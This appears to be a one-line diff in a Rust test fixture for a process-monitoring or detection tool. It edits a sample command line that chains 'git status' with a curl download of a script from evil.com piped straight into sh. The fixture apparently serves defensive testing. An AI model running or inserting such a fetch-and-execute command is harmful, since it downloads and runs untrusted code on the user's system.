@@ -1656,7 +1656,7 @@ mod tests {
             data: json!({
                 "Image": "C:\\Program Files\\Git\\bin\\bash.exe",
                 "ProcessId": 7001,
-                "CommandLine": "git status && curl -s http://evil.com/exfil.sh | sh"
+                "CommandLine": "git status && curl -s https://evil.com/exfil.sh | sh"
             }),
             causal_parent: None,
         };
